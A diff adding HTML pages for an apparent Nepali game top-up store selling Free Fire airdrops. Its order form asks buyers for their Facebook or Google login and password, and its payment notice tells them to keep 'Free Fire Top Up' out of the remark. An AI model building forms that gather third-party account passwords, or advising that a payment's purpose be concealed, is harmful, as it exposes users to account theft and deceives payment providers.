@@ -1,1 +1,1036 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Open Graph Tags (Facebook, WhatsApp Preview को लागि) -->
+    <meta property="og:title" content="Gaule Store - Buy Special Airdrop in Nepal" />
+    <meta property="og:description" content="Buy Free Fire Airdrop in Nepal at the cheapest price with Gaule Store. 1-5 min instant delivery." />
+    <meta property="og:image" content="https://roshantamang2.com.np/ffairdrop/airdrop.png" />
+    <meta property="og:url" content="https://roshantamang2.com.np/ffairdrop/" />
+    <meta property="og:type" content="website" />
 
+    <!-- Twitter Preview को लागि (वैकल्पिक) -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <title>Gaule Store</title>
+
+    <style>
+        body { font-family: sans-serif; margin: 0; background-color: #f4f4f4; }
+        .header { display: flex; align-items: center; padding: 15px; background: white; border-bottom: 2px solid #dc2626; justify-content: space-between; }
+        .menu-icon { font-size: 28px; cursor: pointer; }
+        #nav-menu { display: none; position: absolute; top: 0; left: 0; background: #fff; border: 1px solid #ccc; padding: 20px; width: 250px; height: 100%; z-index: 1000; box-shadow: 2px 2px 10px #ccc; }
+        .menu-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .close-btn { font-size: 30px; cursor: pointer; color: #dc2626; }
+        .search-box { display: flex; gap: 5px; margin-bottom: 20px; }
+        #gameSearch { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
+        .header-right { display: flex; align-items: center; gap: 10px; position: relative; }
+        #profile-pic { width: 35px; height: 35px; border-radius: 50%; display: none; cursor: pointer; border: 2px solid #dc2626; }
+        #profile-dropdown { display: none; position: absolute; top: 50px; right: 0; background: white; border: 1px solid #ccc; padding: 15px; width: 200px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); border-radius: 8px; text-align: center; z-index: 1000; }
+        .user-name { font-weight: bold; font-size: 14px; margin-bottom: 5px; }
+        .user-email { font-size: 12px; color: #666; margin-bottom: 10px; }
+        .change-name { font-size: 11px; color: #dc2626; text-decoration: none; display: block; margin-bottom: 15px; }
+        .logout-btn { background: #dc2626; color: white; border: none; padding: 8px 20px; cursor: pointer; border-radius: 4px; }
+        #nav-menu a { display: block; padding: 12px 0; color: black; text-decoration: none; border-bottom: 1px solid #eee; }
+        .store-title { font-size: 1.5rem; font-weight: bold; }
+        .login-svg { width: 32px; height: 32px; cursor: pointer; stroke: black; fill: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+    <div class="store-title">GAULE <span style="color:#dc2626;">STORE</span></div>
+    <div class="header-right">
+        <div id="login-container" onclick="googleLogin()">
+            <svg class="login-svg" viewBox="0 0 24 24" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        </div>
+        <img id="profile-pic" onclick="toggleProfile()">
+        <div id="profile-dropdown">
+            <div id="display-name" class="user-name"></div>
+            <div id="display-email" class="user-email"></div>
+            <a href="https://myaccount.google.com/personal-info" target="_blank" class="change-name">Change Name</a>
+            <button class="logout-btn" onclick="logoutUser()">Logout</button>
+        </div>
+    </div>
+</div>
+
+<div id="nav-menu">
+    <div class="menu-header">
+        <span style="font-weight:bold;">Menu</span>
+        <span class="close-btn" onclick="toggleMenu()">&times;</span>
+    </div>
+    <div class="search-box">
+        <input type="text" id="gameSearch" placeholder="Search games...">
+        <button onclick="alert('Searching...')">Search</button>
+    </div>
+    <a href="../index.html">Home</a>
+    <a href="shop.html">Shop</a>
+    <a href="https://wa.me/9779761081110" target="_blank">Contact Us</a>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { getDatabase } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBn0kORKJHN_X4uVidhjulK-dAnRujOO3A",
+        authDomain: "gaule-top-up-center.firebaseapp.com",
+        databaseURL: "https://gaule-top-up-center-default-rtdb.firebaseio.com",
+        projectId: "gaule-top-up-center",
+        storageBucket: "gaule-top-up-center.firebasestorage.app",
+        messagingSenderId: "645605489690",
+        appId: "1:645605489690:web:10e333176acd07eec1e5a3"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+    const provider = new GoogleAuthProvider();
+
+    window.toggleMenu = () => { const m = document.getElementById("nav-menu"); m.style.display = (m.style.display === "block") ? "none" : "block"; };
+    window.toggleProfile = () => { const d = document.getElementById("profile-dropdown"); d.style.display = (d.style.display === "block") ? "none" : "block"; };
+    window.googleLogin = () => signInWithPopup(auth, provider);
+    window.logoutUser = () => signOut(auth).then(() => location.reload());
+
+    onAuthStateChanged(auth, (user) => {
+        if (user) {
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("profile-pic").style.display = "block";
+            document.getElementById("profile-pic").src = user.photoURL;
+            document.getElementById("display-name").innerText = user.displayName;
+            document.getElementById("display-email").innerText = user.email;
+        }
+    });
+</script>
+</body>
+</html>
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaule Store - Official Custom Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        body {
+            background-color: #f7fafc; 
+            color: #2d3748; 
+            padding-bottom: 160px; 
+        }
+
+        /* --- BANNER SECTION --- */
+        .banner-container {
+            padding: 16px;
+            background: linear-gradient(180deg, #ffffff 0%, #f7fafc 100%);
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .badges-wrapper {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+
+        .badge {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-weight: 500;
+        }
+
+        .badge.instant { background-color: rgba(255, 179, 0, 0.15); color: #b7791f; }
+        .badge.official { background-color: rgba(46, 213, 115, 0.15); color: #1e7e34; }
+        
+        .banner-flex {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .avatar-img {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 2px solid #ffb300;
+            object-fit: cover;
+        }
+
+        .banner-desc {
+            font-size: 13px;
+            color: #4a5568;
+            line-height: 1.4;
+        }
+
+        /* --- TABS --- */
+        .tabs-container {
+            display: flex;
+            gap: 8px;
+            padding: 0 16px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
+
+        .tab {
+            background-color: #edf2f7;
+            color: #4a5568;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        .tab.active {
+            background-color: #ffffff;
+            color: #1a202c;
+            border: 1px solid #cbd5e0;
+        }
+
+        /* --- INPUT CARD PANEL --- */
+        .section-box {
+            margin: 0 16px 20px 16px;
+        }
+
+        .section-header-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .box-title {
+            font-size: 15px;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: #1a202c;
+        }
+
+        .input-card-panel {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+        }
+
+        .input-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #718096;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        .uid-input {
+            width: 100%;
+            background-color: #f7fafc;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            padding: 14px;
+            color: #1a202c;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 8px;
+            transition: all 0.2s;
+        }
+
+        .uid-input.error-border {
+            border: 1px solid #e53e3e !important;
+            background-color: #fff5f5 !important;
+        }
+
+        /* Password container wrapper for eye button */
+        .password-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .password-input-wrapper .uid-input {
+            margin-bottom: 0;
+            padding-right: 45px;
+        }
+
+        .toggle-password-btn {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+        }
+
+        .toggle-password-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #718096;
+            transition: fill 0.2s;
+        }
+
+        .toggle-password-btn:hover svg {
+            fill: #2d3748;
+        }
+
+        .error-message {
+            color: #e53e3e;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        /* Account Type Selection Styling */
+        .account-type-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 12px;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            padding: 4px;
+        }
+
+        .account-type-grid.error-border {
+            border: 2px solid #e53e3e !important;
+            background-color: #fff5f5;
+            padding: 8px;
+        }
+
+        .account-type-card {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            background: #ffffff;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+
+        .account-type-card.selected {
+            border-color: #ffb300 !important;
+            background-color: #fffdf5 !important;
+            color: #1a202c !important;
+        }
+
+        /* --- PACKS GRID --- */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 4px;
+            border-radius: 14px;
+            border: 2px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .cards-grid.error-border {
+            border: 2px solid #e53e3e !important;
+            background-color: #fff5f5;
+            padding: 8px;
+        }
+
+        .pack-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+            transition: transform 0.1s, border-color 0.2s;
+            display: flex;          
+            flex-direction: column; 
+            align-items: center;    
+            text-align: center;     
+        }
+
+        .pack-card:active { transform: scale(0.98); }
+        .pack-card.selected { border: 2px solid #ffb300 !important; background-color: #fffdf5; }
+        .pack-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; color: #1a202c; }
+        .pack-price { font-size: 15px; font-weight: 700; color: #ffb300; }
+
+       /* --- DRAWER --- */
+                .bottom-drawer {
+            position: fixed;
+            bottom: 55px;          /* थप्नुहोस् */
+            left: 4px;            /* थप्नुहोस् */
+            right: 4px;           /* थप्नुहोस् */
+            background-color: #ffffff;
+            border-top: 1px solid #e2e8f0;
+            border-radius: 16px;   /* 16px 16px 0 0 लाई हटाएर 16px मात्र बनाउने */
+            padding: 16px;
+            box-shadow: 0 -4px 15px rgba(0,0,0,0.05);
+            z-index: 100;
+        }
+
+        .drawer-inner { max-width: 600px; margin: 0 auto; }
+        .row-detail { display: flex; justify-content: space-between; font-size: 13px; color: #4a5568; margin-bottom: 8px; }
+        .row-detail .val-white { color: #1a202c; font-weight: 500; }
+        .total-row { margin-top: 12px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
+        .total-price { font-size: 20px; font-weight: 700; color: #ffb300; }
+
+        .action-btn {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            border: none;
+            cursor: pointer;
+            font-weight: 700;
+            color: #ffffff;
+            background-color: #ffb300;
+            transition: background 0.2s;
+            width: 200px;
+            height: 42px;
+            font-size: 14px;
+            border-radius: 25px;
+            margin: 0 auto;
+        }
+        
+        .action-btn.login-needed {
+            background-color: #dc2626;
+        }
+
+        /* --- QR MODAL --- */
+        .qr-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center;
+            z-index: 200; opacity: 0; pointer-events: none; transition: all 0.3s ease; padding: 20px;
+        }
+        .qr-modal.show { opacity: 1; pointer-events: auto; }
+        .qr-card {
+            background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px; padding: 24px;
+            max-width: 380px; width: 100%; text-align: center; position: relative; transform: scale(0.8);
+            transition: all 0.3s ease; box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-height: 90vh; overflow-y: auto;
+        }
+        .qr-modal.show .qr-card { transform: scale(1); }
+        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 20px; color: #718096; cursor: pointer; }
+        .qr-title { font-size: 18px; font-weight: 600; margin-bottom: 4px; color: #1a202c; }
+        .qr-subtitle { font-size: 13px; color: #4a5568; margin-bottom: 12px; }
+        .account-details-box { background: #fffdf5; border: 1px solid #ffb300; padding: 10px; border-radius: 8px; margin-bottom: 14px; font-size: 13px; text-align: left; line-height: 1.5; }
+        .qr-image-wrapper { background-color: #f7fafc; padding: 12px; border-radius: 12px; display: inline-block; margin-bottom: 15px; border: 1px solid #e2e8f0; }
+        .qr-image-wrapper img { width: 180px; height: 180px; display: block; object-fit: contain; margin: 0 auto; }
+        
+        .txid-container { text-align: left; margin-bottom: 5px; }
+        .txid-label { font-size: 12px; font-weight: 600; color: #4a5568; margin-bottom: 6px; display: block; }
+        .txid-input-wrapper { position: relative; display: flex; align-items: center; }
+        .txid-input-wrapper i { position: absolute; left: 12px; color: #a0aec0; }
+        .txid-input { width: 100%; background-color: #f7fafc; border: 1px solid #cbd5e0; border-radius: 8px; padding: 12px 12px 12px 38px; color: #1a202c; font-size: 14px; outline: none; transition: all 0.2s; }
+        .txid-input.error-border { border: 1px solid #e53e3e !important; background-color: #fff5f5 !important; }
+        .txid-error-message { color: #e53e3e; font-size: 11px; margin-top: 4px; margin-bottom: 10px; display: none; align-items: center; gap: 4px; }
+        
+        .payment-summary-box { background-color: #f7fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px; text-align: left; margin-top: 10px; margin-bottom: 15px; }
+        .pay-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; }
+        .pay-row span:first-child { color: #4a5568; }
+        .pay-row span:last-child { color: #1a202c; font-weight: 500; }
+        .pay-row .highlight-total { color: #ffb300 !important; font-weight: 700; }
+        .done-btn { background-color: #ffb300; color: #ffffff; border: none; width: 100%; padding: 12px; font-weight: 700; border-radius: 8px; cursor: pointer; }
+
+        /* --- SUCCESS MODAL --- */
+        .success-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(26, 32, 44, 0.6);
+            backdrop-filter: blur(4px); display: flex; justify-content: center; align-items: center; z-index: 300; opacity: 0; pointer-events: none; transition: all 0.3s ease-in-out;
+        }
+        .success-modal.show { opacity: 1; pointer-events: auto; }
+        .success-card { background: #ffffff; border-radius: 20px; padding: 30px; max-width: 360px; width: 90%; text-align: center; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); transform: translateY(30px); transition: all 0.3s ease-in-out; }
+        .success-modal.show .success-card { transform: translateY(0); }
+        .success-checkmark { width: 72px; height: 72px; background: #2ed573; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; animation: pulseCircle 1.6s infinite cubic-bezier(0.66, 0, 0, 1); }
+        .success-checkmark i { color: white; font-size: 32px; transform: scale(0); animation: scaleCheck 0.4s 0.2s forwards cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        
+        @keyframes pulseCircle { 0% { box-shadow: 0 0 0 0 rgba(46, 213, 115, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(46, 213, 115, 0); } 100% { box-shadow: 0 0 0 0 rgba(46, 213, 115, 0); } }
+        @keyframes scaleCheck { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        
+        .success-title { font-size: 22px; font-weight: 700; color: #1a202c; margin-bottom: 8px; }
+        .success-msg { font-size: 14px; color: #4a5568; line-height: 1.5; margin-bottom: 18px; }
+        .success-receipt-info { background-color: #f7fafc; border: 1px dashed #cbd5e0; border-radius: 8px; padding: 12px; text-align: left; font-size: 13px; margin-bottom: 20px; }
+        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .receipt-row span:first-child { color: #718096; }
+        .receipt-row span:last-child { color: #2d3748; font-weight: 600; }
+        .success-close-btn { background-color: #1a202c; color: #ffffff; border: none; width: 100%; padding: 12px; font-weight: 600; border-radius: 8px; cursor: pointer; }
+        
+        .pack-img {
+            width: 75%; 
+            max-height: 65%;
+            object-fit: contain;
+            margin-bottom: auto;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+ 
+   <div class="banner-container">
+        <div class="badges-wrapper">
+            <div class="badge instant"> 1 min - 5 min Delivery</div>
+            <div class="badge official"><i class="fa-solid fa-circle-check"></i> Official Supply</div>
+        </div>
+        <div class="banner-flex">
+            <img class="avatar-img" src="airdrop.png" alt="Special Airdop">
+            <div>
+                <div class="badge Region">Nepal/Bangladesh </div>
+                <p class="banner-desc">Buy Garena Fire Special Airdrop in Nepal at the cheapest price with Gaule Store.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="tabs-container">
+        <div class="tab active">Special Airdrop</div>
+    </div>
+
+    <div class="section-box">
+        <div class="section-header-flex">
+            <div class="box-title">Account Credentials & Contact <span style="color: #e53e3e;">*</span></div>
+        </div>
+        <div class="input-card-panel" style="display: flex; flex-direction: column; gap: 12px;">
+            
+            <div>
+                <div class="input-label" style="margin-bottom: 5px; font-size: 11px; font-weight: 600;">Login Type <span style="color: #e53e3e;">*</span></div>
+                <div class="account-type-grid" id="account-type-wrapper">
+                    <div class="account-type-card" data-type="Facebook" onclick="selectAccountType(this)">
+                        <i class="fa-brands fa-facebook" style="color: #1877f2;"></i> Facebook
+                    </div>
+                    <div class="account-type-card" data-type="Google" onclick="selectAccountType(this)">
+                        <i class="fa-brands fa-google" style="color: #ea4335;"></i> Google
+                    </div>
+                </div>
+                <div class="error-message" id="account-type-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Please select Facebook or Google!</span>
+                </div>
+            </div>
+
+            <div>
+                <div class="input-label">Phone Number or Email</div>
+                <input type="text" id="game-phone-email" class="uid-input" placeholder="Enter Phone Number or Email" oninput="validateField('game-phone-email', 'phone-email-error')">
+                <div class="error-message" id="phone-email-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Phone number or email is required!</span>
+                </div>
+            </div>
+
+            <div>
+                <div class="input-label">Password</div>
+                <div class="password-input-wrapper">
+                    <input type="password" id="game-password" class="uid-input" placeholder="Enter Password" oninput="validateField('game-password', 'password-error')">
+                    <button type="button" class="toggle-password-btn" onclick="togglePasswordVisibility()" id="eyeBtn" aria-label="Toggle password visibility">
+                        <svg id="eyeIcon" viewBox="0 0 24 24">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="error-message" id="password-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Password is required!</span>
+                </div>
+            </div>
+
+            <div>
+                <div class="input-label">WhatsApp Number</div>
+                <input type="tel" id="whatsapp-number" class="uid-input" placeholder="Enter WhatsApp Number" oninput="validateField('whatsapp-number', 'whatsapp-error')">
+                <div class="error-message" id="whatsapp-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>WhatsApp number is required!</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section-box">
+        <div class="section-header-flex">
+            <div class="box-title">Special Airdrop <span style="color: #e53e3e;">*</span></div>
+        </div>
+        
+        <div class="error-message" id="pack-error" style="margin-bottom: 8px;">
+            <i class="fa-solid fa-circle-exclamation"></i> <span>Please select a Special Airdrop!</span>
+        </div>
+
+        <div class="cards-grid" id="diamonds-wrapper">
+            <div class="pack-card" onclick="selectPack(this, 'Airdrop 0.99$', '170')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">0.99$</div>
+                <div class="pack-price">Rs.170</div>
+            </div>
+
+            <div class="pack-card" onclick="selectPack(this, '1$-1.99$', '360')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">1$-1.99$</div>
+                <div class="pack-price">Rs.360</div>
+            </div>
+
+            <div class="pack-card" onclick="selectPack(this, '2$-2.99$', '510')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">2$-2.99$</div>
+                <div class="pack-price">Rs.510</div>
+            </div>
+
+            <div class="pack-card" onclick="selectPack(this, '3$-3.99$', '675')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">3$-3.99$</div>
+                <div class="pack-price">Rs.675</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-drawer">
+        <div class="drawer-inner">
+            <div class="row-detail">
+                <span>Item</span>
+                <span class="val-white" id="summary-item">-</span>
+            </div>
+            <div class="total-row">
+                <span class="total-label">Total</span>
+                <span class="total-price" id="summary-total">Rs 0.00</span>
+            </div>
+            
+            <button id="main-action-btn" class="action-btn">
+                <i class="fa-solid fa-basket-shopping"></i> Buy Now
+            </button>
+        </div>
+    </div>
+
+    <div class="qr-modal" id="qrModal">
+        <div class="qr-card">
+            <i class="fa-solid fa-xmark close-modal" onclick="closePaymentModal()"></i>
+            <div class="qr-title">Scan to Pay</div>
+            <div class="qr-subtitle">Please scan the QR code via Khalti, eSewa or Fonepay</div>
+            
+            <div class="account-details-box">
+                <strong> Notice:</strong> Gaule Store <br>
+                <strong> Remark:</strong> Please write your real name in the remarks. Do not write Free Fire Top Up.
+            </div>
+
+            <div class="qr-image-wrapper">
+                <img src="qr_code.png" alt="Payment QR Code">
+            </div>
+
+            <div class="txid-container">
+                <label class="txid-label" for="txid">Transaction ID / Ref ID <span style="color: #e53e3e;">*</span></label>
+                <div class="txid-input-wrapper">
+                    <i class="fa-solid fa-receipt"></i>
+                    <input type="text" id="txid" class="txid-input" placeholder="Enter transaction ID after payment" oninput="validateTxIDLive()">
+                </div>
+                <div class="txid-error-message" id="txid-error" style="display: none;">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Transaction ID is required to verify payment!</span>
+                </div>
+            </div>
+
+            <div class="payment-summary-box">
+                <div class="pay-row">
+                    <span>Login Type:</span>
+                    <span id="modal-account-type" style="font-weight: bold; color: #1a202c;">-</span>
+                </div>
+                <div class="pay-row">
+                    <span>Selected Pack:</span>
+                    <span id="modal-item">-</span>
+                </div>
+                <div class="pay-row">
+                    <span>Amount Due:</span>
+                    <span class="highlight-total" id="modal-total">Rs 0.00</span>
+                </div>
+            </div>
+
+            <button class="done-btn" onclick="submitPayment()">Submit Payment</button>
+        </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="success-card">
+            <div class="success-checkmark">
+                <i class="fa-solid fa-check"></i>
+            </div>
+            <div class="success-title">Order Submitted!</div>
+            <p class="success-msg">Your order has been received. Our team will verify and top-up your diamonds instantly.</p>
+            
+            <div class="success-receipt-info">
+                <div class="receipt-row">
+                    <span>Login Type:</span>
+                    <span id="receipt-account-type">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Item:</span>
+                    <span id="receipt-item">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Price:</span>
+                    <span id="receipt-price" style="color: #2ed573;">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Status:</span>
+                    <span style="color: #ffb300;">Pending Verification</span>
+                </div>
+            </div>
+
+            <button class="success-close-btn" onclick="closeSuccessModal()">Great, Thanks!</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBn0kORKJHN_X4uVidhjulK-dAnRujOO3A",
+            authDomain: "gaule-top-up-center.firebaseapp.com",
+            databaseURL: "https://gaule-top-up-center-default-rtdb.firebaseio.com",
+            projectId: "gaule-top-up-center",
+            storageBucket: "gaule-top-up-center.firebasestorage.app",
+            messagingSenderId: "645605489690",
+            appId: "1:645605489690:web:10e333176acd07eec1e5a3"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
+        const provider = new GoogleAuthProvider();
+
+        let currentUser = null;
+        let selectedItemName = "";
+        let selectedItemPrice = "";
+        let selectedAccountType = "";
+
+        const mainActionBtn = document.getElementById('main-action-btn');
+        const gamePhoneEmailInput = document.getElementById('game-phone-email');
+        const phoneEmailError = document.getElementById('phone-email-error');
+        const gamePasswordInput = document.getElementById('game-password');
+        const passwordError = document.getElementById('password-error');
+        const whatsappInput = document.getElementById('whatsapp-number');
+        const whatsappError = document.getElementById('whatsapp-error');
+        const packError = document.getElementById('pack-error');
+        const diamondsWrapper = document.getElementById('diamonds-wrapper');
+        const accountTypeWrapper = document.getElementById('account-type-wrapper');
+        const accountTypeError = document.getElementById('account-type-error');
+        const txidInput = document.getElementById('txid');
+        const txidError = document.getElementById('txid-error');
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                mainActionBtn.innerHTML = `<i class="fa-solid fa-basket-shopping"></i> Buy Now`;
+                mainActionBtn.classList.remove('login-needed');
+            } else {
+                currentUser = null;
+                mainActionBtn.innerHTML = `<i class="fa-solid fa-right-to-bracket"></i> Login to Buy`;
+                mainActionBtn.classList.add('login-needed');
+            }
+        });
+
+        // Toggle Password Visibility with SVG change
+        window.togglePasswordVisibility = function() {
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (gamePasswordInput.type === "password") {
+                gamePasswordInput.type = "text";
+                // Closed Eye SVG (Show password state)
+                eyeIcon.innerHTML = `<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>`;
+            } else {
+                gamePasswordInput.type = "password";
+                // Open Eye SVG (Hidden password state)
+                eyeIcon.innerHTML = `<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>`;
+            }
+        };
+
+        window.selectAccountType = function(element) {
+            accountTypeWrapper.classList.remove('error-border');
+            accountTypeError.style.display = "none";
+
+            document.querySelectorAll('.account-type-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedAccountType = element.getAttribute('data-type');
+        };
+
+        window.selectPack = function(element, name, price) {
+            diamondsWrapper.classList.remove('error-border');
+            packError.style.display = "none";
+
+            document.querySelectorAll('.pack-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            
+            selectedItemName = name;
+            selectedItemPrice = price;
+
+            document.getElementById('summary-item').innerText = name;
+            document.getElementById('summary-total').innerText = 'Rs ' + price;
+        };
+
+        window.validateField = function(fieldId, errorId) {
+            let field = document.getElementById(fieldId);
+            let err = document.getElementById(errorId);
+            if (field.value.trim() !== "") {
+                field.classList.remove('error-border');
+                err.style.display = "none";
+            }
+        };
+
+        window.validateTxIDLive = function() {
+            if (txidInput.value.trim() !== "") {
+                txidInput.classList.remove('error-border');
+                txidError.style.display = "none";
+            }
+        };
+
+        mainActionBtn.onclick = function() {
+            if (!currentUser) {
+                signInWithPopup(auth, provider).then((result) => {
+                    console.log("Logged in!");
+                }).catch((error) => {
+                    alert("लगइन असफल भयो: " + error.message);
+                });
+                return;
+            }
+
+            let isFormValid = true;
+
+            if (!selectedAccountType) {
+                accountTypeWrapper.classList.add('error-border');
+                accountTypeError.style.display = "flex";
